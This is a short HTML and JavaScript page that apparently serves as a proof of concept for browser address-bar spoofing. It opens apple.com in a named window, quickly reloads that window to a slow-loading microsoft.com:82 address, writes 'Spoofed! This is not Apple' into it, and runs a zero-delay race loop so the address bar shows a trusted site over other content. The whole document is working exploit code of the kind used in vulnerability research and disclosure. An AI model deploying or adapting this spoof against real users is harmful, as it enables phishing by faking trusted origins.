<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>
    <a href="#" onclick="startSpoof()">Click Here</a>
</body>
    
<script>

let windowSpoof;

function race() {
  try {
    //
    windowSpoof.location.href;
  } catch (e) {
    //
    windowSpoof.location.href = "https://example.com";
  }
}

function startSpoof() {

  //
  windowSpoof = window.open("https://apple.com", "x");

  //
  setTimeout(() => {
    windowSpoof = window.open("https://www.microsoft.com:82", "x");

    try {
      windowSpoof.document.write(
        "<h2>Spoofed! This is not Apple</h2>"
      );
    } catch(e) {}

  }, 10);

  //
  setInterval(race, 0);
}

</script>
</html>
